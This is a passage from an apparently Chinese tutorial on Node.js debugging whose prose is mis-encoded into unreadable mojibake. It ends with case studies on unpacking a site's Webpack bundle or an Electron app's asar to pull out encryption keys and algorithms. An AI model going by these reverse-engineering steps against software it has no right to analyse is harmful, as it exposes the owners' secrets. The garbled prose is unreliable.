<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">process</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span><span class="w">           </span><span class="c1">// æ–­ç‚¹</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>è§£å†³æ–¹æ¡ˆ 2: å¯ç”¨ async stack traces</strong></p>

      <p>åœ¨ Chrome DevTools ä¸­ï¼š</p>

      <ul>
        <li>Settings â†’ Enable async stack traces</li>
      </ul>

      <h3 id="52-è°ƒè¯•äº‹ä»¶å¾ªç¯">5.2 è°ƒè¯•äº‹ä»¶å¾ªç¯</h3>

      <p><strong>æŸ¥çœ‹å½“å‰äº‹ä»¶å¾ªç¯çŠ¶æ€</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">async_hooks</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;async_hooks&#39;</span><span class="p">);</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">hooks</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">async_hooks</span><span class="p">.</span><span class="nx">createHook</span><span class="p">({</span>
<span class="w">    </span><span class="nx">init</span><span class="p">(</span><span class="nx">asyncId</span><span class="p">,</span><span class="w"> </span><span class="nx">type</span><span class="p">,</span><span class="w"> </span><span class="nx">triggerAsyncId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[Init] </span><span class="si">${</span><span class="nx">type</span><span class="si">}</span><span class="sb"> (id=</span><span class="si">${</span><span class="nx">asyncId</span><span class="si">}</span><span class="sb">, trigger=</span><span class="si">${</span><span class="nx">triggerAsyncId</span><span class="si">}</span><span class="sb">)`</span><span class="p">);</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nx">before</span><span class="p">(</span><span class="nx">asyncId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[Before] </span><span class="si">${</span><span class="nx">asyncId</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nx">after</span><span class="p">(</span><span class="nx">asyncId</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`[After] </span><span class="si">${</span><span class="nx">asyncId</span><span class="si">}</span><span class="sb">`</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>

<span class="nx">hooks</span><span class="p">.</span><span class="nx">enable</span><span class="p">();</span>

<span class="c1">// è¿è¡Œä½ çš„å¼‚æ­¥ä»£ç </span>
<span class="nx">setTimeout</span><span class="p">(()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Timeout executed&#39;</span><span class="p">);</span>
<span class="p">},</span><span class="w"> </span><span class="mf">1000</span><span class="p">);</span>
</code></pre>
      </div>

      <h3 id="53-è°ƒè¯•-setinterval-æ³„æ¼">5.3 è°ƒè¯• setInterval æ³„æ¼</h3>

      <p><strong>é—®é¢˜</strong>: setInterval æ²¡æœ‰æ­£ç¡®æ¸…ç†ï¼Œå¯¼è‡´å†…å­˜æ³„æ¼</p>

      <p><strong>æ£€æµ‹æ–¹æ³•</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">timers</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Set</span><span class="p">();</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">originalSetInterval</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">global</span><span class="p">.</span><span class="nx">setInterval</span><span class="p">;</span>
<span class="nb">global</span><span class="p">.</span><span class="nx">setInterval</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(...</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">timer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">originalSetInterval</span><span class="p">(...</span><span class="nx">args</span><span class="p">);</span>
<span class="w">    </span><span class="nx">timers</span><span class="p">.</span><span class="nx">add</span><span class="p">(</span><span class="nx">timer</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[setInterval]&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="mf">1</span><span class="p">],</span><span class="w"> </span><span class="s1">&#39;å·²åˆ›å»º&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">timers</span><span class="p">.</span><span class="nx">size</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;ä¸ªå®šæ—¶å™¨&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">timer</span><span class="p">;</span>
<span class="p">};</span>

<span class="kd">const</span><span class="w"> </span><span class="nx">originalClearInterval</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">global</span><span class="p">.</span><span class="nx">clearInterval</span><span class="p">;</span>
<span class="nb">global</span><span class="p">.</span><span class="nx">clearInterval</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">timer</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">timers</span><span class="p">.</span><span class="ow">delete</span><span class="p">(</span><span class="nx">timer</span><span class="p">);</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[clearInterval] å·²æ¸…ç†&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">timers</span><span class="p">.</span><span class="nx">size</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;ä¸ªå®šæ—¶å™¨å‰©ä½™&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">originalClearInterval</span><span class="p">(</span><span class="nx">timer</span><span class="p">);</span>
<span class="p">};</span>
</code></pre>
      </div>

      <hr />

      <h2 id="6-è°ƒè¯•-es6-ç‰¹æ€§">6. è°ƒè¯• ES6+ ç‰¹æ€§</h2>

      <h3 id="61-è°ƒè¯•-es-modules">6.1 è°ƒè¯• ES Modules</h3>

      <p><strong>é—®é¢˜</strong>: ä½¿ç”¨ <code>import</code>/<code>export</code> çš„æ¨¡å—æ— æ³•ç›´æ¥è°ƒè¯•</p>

      <p><strong>æ–¹æ³• 1: åŸç”Ÿæ”¯æŒ (Node.js 14+)</strong></p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// package.json</span>
<span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;module&quot;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <div class="codehilite">
        <pre><span></span><code>node<span class="w"> </span>--inspect-brk<span class="w"> </span>--experimental-modules<span class="w"> </span>script.mjs
</code></pre>
      </div>

      <p><strong>æ–¹æ³• 2: ä½¿ç”¨ babel-node</strong></p>

      <div class="codehilite">
        <pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>-D<span class="w"> </span>@babel/node<span class="w"> </span>@babel/core<span class="w"> </span>@babel/preset-env

<span class="c1"># è°ƒè¯•</span>
node<span class="w"> </span>--inspect-brk<span class="w"> </span>node_modules/@babel/node/bin/babel-node.js<span class="w"> </span>script.js
</code></pre>
      </div>

      <h3 id="62-è°ƒè¯•-typescript">6.2 è°ƒè¯• TypeScript</h3>

      <p><strong>æ–¹æ³• 1: ts-node</strong></p>

      <div class="codehilite">
        <pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>-D<span class="w"> </span>ts-node

<span class="c1"># è°ƒè¯•</span>
node<span class="w"> </span>--inspect-brk<span class="w"> </span>-r<span class="w"> </span>ts-node/register<span class="w"> </span>script.ts
</code></pre>
      </div>

      <p><strong>æ–¹æ³• 2: Source Maps</strong></p>

      <p><code>tsconfig.json</code>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;compilerOptions&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nt">&quot;sourceMap&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span>
<span class="w">        </span><span class="nt">&quot;outDir&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;./dist&quot;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><code>.vscode/launch.json</code>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="p">{</span>
<span class="w">    </span><span class="nt">&quot;type&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;node&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;request&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;launch&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;name&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;è°ƒè¯• TypeScript&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;program&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;${workspaceFolder}/src/index.ts&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;preLaunchTask&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;tsc: build - tsconfig.json&quot;</span><span class="p">,</span>
<span class="w">    </span><span class="nt">&quot;outFiles&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;${workspaceFolder}/dist/**/*.js&quot;</span><span class="p">],</span>
<span class="w">    </span><span class="nt">&quot;sourceMaps&quot;</span><span class="p">:</span><span class="w"> </span><span class="kc">true</span>
<span class="p">}</span>
</code></pre>
      </div>

      <hr />

      <h2 id="7-è¿œç¨‹è°ƒè¯•">7. è¿œç¨‹è°ƒè¯•</h2>

      <h3 id="71-è°ƒè¯•ç”Ÿäº§ç¯å¢ƒ">7.1 è°ƒè¯•ç”Ÿäº§ç¯å¢ƒ</h3>

      <p><strong>è­¦å‘Š</strong>: ç”Ÿäº§ç¯å¢ƒè°ƒè¯•éœ€è°¨æ…ï¼Œå¯èƒ½å½±å“æ€§èƒ½</p>

      <p><strong>å¯åŠ¨æœåŠ¡å™¨</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æœåŠ¡å™¨ç«¯ï¼ˆå…è®¸æ‰€æœ‰ IP è¿æ¥ï¼‰</span>
node<span class="w"> </span>--inspect<span class="o">=</span><span class="m">0</span>.0.0.0:9229<span class="w"> </span>server.js
</code></pre>
      </div>

      <p><strong>æœ¬åœ°è¿æ¥</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># SSH éš§é“è½¬å‘</span>
ssh<span class="w"> </span>-L<span class="w"> </span><span class="m">9229</span>:localhost:9229<span class="w"> </span>user@remote-server

<span class="c1"># ç°åœ¨è®¿é—® chrome://inspect å³å¯è°ƒè¯•è¿œç¨‹æœåŠ¡å™¨</span>
</code></pre>
      </div>

      <p><strong>å®‰å…¨å»ºè®®</strong>:</p>

      <ul>
        <li>ä»…åœ¨å¼€å‘/æµ‹è¯•ç¯å¢ƒä½¿ç”¨</li>
        <li>ä½¿ç”¨ SSH éš§é“ï¼Œä¸è¦ç›´æ¥æš´éœ²è°ƒè¯•ç«¯å£</li>
        <li>è°ƒè¯•åç«‹å³å…³é—­</li>
      </ul>

      <h3 id="72-docker-å®¹å™¨è°ƒè¯•">7.2 Docker å®¹å™¨è°ƒè¯•</h3>

      <p><strong>Dockerfile</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="k">FROM</span><span class="w"> </span><span class="s">node:18</span>
<span class="k">WORKDIR</span><span class="w"> </span><span class="s">/app</span>
<span class="k">COPY</span><span class="w"> </span>.<span class="w"> </span>.
<span class="k">RUN</span><span class="w"> </span>npm<span class="w"> </span>install

<span class="c"># æš´éœ²è°ƒè¯•ç«¯å£</span>
<span class="k">EXPOSE</span><span class="w"> </span><span class="s">9229</span>

<span class="k">CMD</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;node&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;--inspect=0.0.0.0:9229&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;server.js&quot;</span><span class="p">]</span>
</code></pre>
      </div>

      <p><strong>è¿è¡Œ</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># æ˜ å°„è°ƒè¯•ç«¯å£</span>
docker<span class="w"> </span>run<span class="w"> </span>-p<span class="w"> </span><span class="m">9229</span>:9229<span class="w"> </span>-p<span class="w"> </span><span class="m">3000</span>:3000<span class="w"> </span>my-app

<span class="c1"># è®¿é—® chrome://inspect</span>
</code></pre>
      </div>

      <p><strong>docker-compose.yml</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;3&#39;</span>
<span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">app</span><span class="p">:</span>
<span class="w">    </span><span class="nt">build</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">.</span>
<span class="w">    </span><span class="nt">ports</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;3000:3000&quot;</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&quot;9229:9229&quot;</span>
<span class="w">    </span><span class="nt">command</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">node --inspect=0.0.0.0:9229 server.js</span>
<span class="w">    </span><span class="nt">volumes</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">.:/app</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">/app/node_modules</span><span class="w">  </span><span class="c1"># é¿å…è¦†ç›–</span>
</code></pre>
      </div>

      <hr />

      <h2 id="8-è°ƒè¯•æŠ€å·§ä¸æœ€ä½³å®è·µ">8. è°ƒè¯•æŠ€å·§ä¸æœ€ä½³å®è·µ</h2>

      <h3 id="81-æ¡ä»¶æ–­ç‚¹">8.1 æ¡ä»¶æ–­ç‚¹</h3>

      <p>åœ¨ Chrome DevTools æˆ– VSCode ä¸­ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// å³é”®æ–­ç‚¹ â†’ Edit breakpoint â†’ Condition</span>
<span class="nx">user_id</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">123</span>

<span class="c1">// æˆ–åœ¨ä»£ç ä¸­</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">user_id</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="mf">123</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">debugger</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="82-logpoints-æ—¥å¿—ç‚¹">8.2 Logpoints (æ—¥å¿—ç‚¹)</h3>

      <p><strong>ä¸ä¿®æ”¹æºç çš„æƒ…å†µä¸‹æ‰“å°æ—¥å¿—</strong>:</p>

      <p>VSCode: å³é”®è¡Œå· â†’ &#8220;Add Logpoint&#8221;</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// è¯­æ³•ï¼ˆä¸éœ€è¦ console.logï¼‰</span>
<span class="s2">&quot;user_id:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">user_id</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;key:&quot;</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span>
</code></pre>
      </div>

      <h3 id="83-watch-è¡¨è¾¾å¼">8.3 Watch è¡¨è¾¾å¼</h3>

      <p>åœ¨ Watch é¢æ¿æ·»åŠ è¡¨è¾¾å¼ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">params</span><span class="p">)</span>
<span class="nx">Buffer</span><span class="p">.</span><span class="kr">from</span><span class="p">(</span><span class="nx">key</span><span class="p">).</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">)</span>
<span class="ow">new</span><span class="w"> </span><span class="nb">Date</span><span class="p">(</span><span class="nx">timestamp</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="84-ç¯å¢ƒå˜é‡è°ƒè¯•">8.4 ç¯å¢ƒå˜é‡è°ƒè¯•</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># è®¾ç½®ç¯å¢ƒå˜é‡</span>
<span class="nb">export</span><span class="w"> </span><span class="nv">DEBUG</span><span class="o">=</span>*<span class="w">  </span><span class="c1"># å¯ç”¨æ‰€æœ‰ debug æ—¥å¿—</span>
<span class="nb">export</span><span class="w"> </span><span class="nv">NODE_ENV</span><span class="o">=</span>development

<span class="c1"># åœ¨ä»£ç ä¸­è¯»å–</span>
console.log<span class="o">(</span>process.env.DEBUG<span class="o">)</span><span class="p">;</span>
</code></pre>
      </div>

      <p><strong>ä½¿ç”¨ debug æ¨¡å—</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">debug</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;debug&#39;</span><span class="p">)(</span><span class="s1">&#39;app:encrypt&#39;</span><span class="p">);</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">data</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">debug</span><span class="p">(</span><span class="s1">&#39;åŠ å¯†å¼€å§‹, data=%s, key=%s&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">,</span><span class="w"> </span><span class="nx">key</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;hex&#39;</span><span class="p">));</span>
<span class="w">    </span><span class="c1">// ...</span>
<span class="w">    </span><span class="nx">debug</span><span class="p">(</span><span class="s1">&#39;åŠ å¯†å®Œæˆ, result=%s&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">result</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p>è¿è¡Œ:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nv">DEBUG</span><span class="o">=</span>app:*<span class="w"> </span>node<span class="w"> </span>script.js
</code></pre>
      </div>

      <h3 id="85-repl-è°ƒè¯•">8.5 REPL è°ƒè¯•</h3>

      <p><strong>åœ¨è¿è¡Œæ—¶è¿›å…¥ REPL</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">const</span><span class="w"> </span><span class="nx">repl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;repl&#39;</span><span class="p">);</span>

<span class="kd">function</span><span class="w"> </span><span class="nx">complexFunction</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">step1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">process1</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// è¿›å…¥ REPL æ£€æŸ¥ä¸­é—´ç»“æœ</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">DEBUG</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;è¿›å…¥ REPL è°ƒè¯•...&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">repl</span><span class="p">.</span><span class="nx">start</span><span class="p">(</span><span class="s1">&#39;&gt; &#39;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">r</span><span class="p">.</span><span class="nx">context</span><span class="p">.</span><span class="nx">step1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">step1</span><span class="p">;</span><span class="w">  </span><span class="c1">// å¯¼å‡ºå˜é‡åˆ° REPL</span>
<span class="w">        </span><span class="nx">r</span><span class="p">.</span><span class="nx">context</span><span class="p">.</span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">data</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">step2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">process2</span><span class="p">(</span><span class="nx">step1</span><span class="p">);</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">step2</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p>è¿è¡Œ:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="nv">DEBUG</span><span class="o">=</span><span class="m">1</span><span class="w"> </span>node<span class="w"> </span>script.js

<span class="c1"># åœ¨ REPL ä¸­</span>
&gt;<span class="w"> </span>step1
&gt;<span class="w"> </span>JSON.stringify<span class="o">(</span>step1<span class="o">)</span>
&gt;<span class="w"> </span>.exit<span class="w">  </span>//<span class="w"> </span>é€€å‡º<span class="w"> </span>REPL<span class="w"> </span>ç»§ç»­æ‰§è¡Œ
</code></pre>
      </div>

      <hr />

      <h2 id="9-å®æˆ˜æ¡ˆä¾‹">9. å®æˆ˜æ¡ˆä¾‹</h2>

      <h3 id="æ¡ˆä¾‹-1é€†å‘-webpack-æ‰“åŒ…çš„åŠ å¯†é€»è¾‘">æ¡ˆä¾‹ 1ï¼šé€†å‘ Webpack æ‰“åŒ…çš„åŠ å¯†é€»è¾‘</h3>

      <p><strong>ç›®æ ‡</strong>: æŸç½‘ç«™çš„ JS æ˜¯ Webpack æ‰“åŒ…çš„ï¼Œæ‰¾åˆ°åŠ å¯†å‡½æ•°</p>

      <p><strong>æ­¥éª¤</strong>:</p>

      <ol>
        <li><strong>ä¸‹è½½æ‰“åŒ…åçš„ JS</strong>:</li>
      </ol>

      <div class="codehilite">
        <pre><span></span><code>curl<span class="w"> </span>https://example.com/app.bundle.js<span class="w"> </span>&gt;<span class="w"> </span>app.bundle.js
</code></pre>
      </div>

      <ol start="2">
        <li><strong>ä½¿ç”¨ webcrack åæ‰“åŒ…</strong>:</li>
      </ol>

      <div class="codehilite">
        <pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>-g<span class="w"> </span>webcrack
webcrack<span class="w"> </span>app.bundle.js<span class="w"> </span>-o<span class="w"> </span>./unpacked
</code></pre>
      </div>

      <ol start="3">
        <li><strong>æ‰¾åˆ°åŠ å¯†å‡½æ•°</strong> (å‡è®¾åœ¨ <code>./unpacked/module_123.js</code>):</li>
      </ol>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">encrypt</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// å¤æ‚çš„åŠ å¯†é€»è¾‘</span>
<span class="p">}</span>
</code></pre>
      </div>

      <ol start="4">
        <li><strong>åˆ›å»ºæµ‹è¯•è„šæœ¬</strong> <code>test.js</code>:</li>
      </ol>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// å¤åˆ¶ module_123.js çš„å†…å®¹</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">encrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;./unpacked/module_123.js&#39;</span><span class="p">);</span>

<span class="c1">// æµ‹è¯•</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">encrypt</span><span class="p">(</span><span class="s1">&#39;Hello&#39;</span><span class="p">);</span>
<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">result</span><span class="p">);</span>
</code></pre>
      </div>

      <ol start="5">
        <li><strong>è°ƒè¯•</strong>:</li>
      </ol>

      <div class="codehilite">
        <pre><span></span><code>node<span class="w"> </span>--inspect-brk<span class="w"> </span>test.js
</code></pre>
      </div>

      <ol start="6">
        <li><strong>åœ¨ DevTools ä¸­</strong>:
          <ul>
            <li>å•æ­¥è°ƒè¯• <code>encrypt</code> å‡½æ•°</li>
            <li>æŸ¥çœ‹ä¸­é—´å˜é‡</li>
            <li>æå–å¯†é’¥/ç®—æ³•</li>
          </ul>
        </li>
      </ol>

      <h3 id="æ¡ˆä¾‹-2è°ƒè¯•-electron-åº”ç”¨">æ¡ˆä¾‹ 2ï¼šè°ƒè¯• Electron åº”ç”¨</h3>

      <p><strong>ç›®æ ‡</strong>: é€†å‘æŸ Electron æ¡Œé¢åº”ç”¨çš„åŠ å¯†é€šä¿¡</p>

      <p><strong>æ­¥éª¤</strong>:</p>

      <ol>
        <li><strong>æ‰¾åˆ°åº”ç”¨çš„ asar æ–‡ä»¶</strong>:</li>
      </ol>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># macOS</span>
<span class="nb">cd</span><span class="w"> </span>/Applications/MyApp.app/Contents/Resources
ls<span class="w"> </span>app.asar

<span class="c1"># Windows</span>
<span class="nb">cd</span><span class="w"> </span>C:<span class="se">\P</span>rogram<span class="w"> </span>Files<span class="se">\M</span>yApp<span class="se">\r</span>esources
dir<span class="w"> </span>app.asar
</code></pre>
      </div>

      <ol start="2">
        <li><strong>è§£åŒ… asar</strong>:</li>
      </ol>

      <div class="codehilite">
        <pre><span></span><code>npm<span class="w"> </span>install<span class="w"> </span>-g<span class="w"> </span>asar

asar<span class="w"> </span>extract<span class="w"> </span>app.asar<span class="w"> </span>app_unpacked
<span class="nb">cd</span><span class="w"> </span>app_unpacked
</code></pre>
      </div>

      <ol start="3">
        <li><strong>å¯åŠ¨è°ƒè¯•æ¨¡å¼</strong>:</li>
      </ol>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># è®¾ç½®ç¯å¢ƒå˜é‡</span>
<span class="nb">export</span><span class="w"> </span><span class="nv">ELECTRON_ENABLE_LOGGING</span><span class="o">=</span><span class="m">1</span>
<span class="nb">export</span><span class="w"> </span><span class="nv">ELECTRON_RUN_AS_NODE</span><span class="o">=</span><span class="m">1</span>

<span class="c1"># å¯åŠ¨ Electron å¹¶é™„åŠ è°ƒè¯•å™¨</span>
electron<span class="w"> </span>--inspect-brk<span class="o">=</span><span class="m">5858</span><span class="w"> </span>.
</code></pre>
      </div>

      <ol start="4">
        <li><strong>è¿æ¥ Chrome DevTools</strong>:</li>
      </ol>

      <pre><code>chrome://inspect
</code></pre>

      <ol start="5">
        <li><strong>åˆ†æåŠ å¯†é€»è¾‘</strong>:
          <ul>
            <li>åœ¨ <code>main.js</code> æˆ– <code>renderer.js</code> ä¸­æœç´¢åŠ å¯†ç›¸å…³å‡½æ•°</li>
            <li>æ‰“æ–­ç‚¹è°ƒè¯•</li>
          </ul>
        </li>
      </ol>

      <h3 id="æ¡ˆä¾‹-3hook-require-è¿½è¸ªæ¨¡å—åŠ è½½">æ¡ˆä¾‹ 3ï¼šHook require() è¿½è¸ªæ¨¡å—åŠ è½½</h3>

      <p><strong>ç›®æ ‡</strong>: æŸ¥çœ‹è„šæœ¬åŠ è½½äº†å“ªäº›æ¨¡å—</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// hook-require.js</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">Module</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">require</span><span class="p">(</span><span class="s1">&#39;module&#39;</span><span class="p">);</span>
<span class="kd">const</span><span class="w"> </span><span class="nx">originalRequire</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">Module</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">require</span><span class="p">;</span>

<span class="nx">Module</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">require</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">id</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[require]&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">id</span><span class="p">);</span>

<span class="w">    </span><span class="c1">// æ‹¦æˆªç‰¹å®šæ¨¡å—</span>
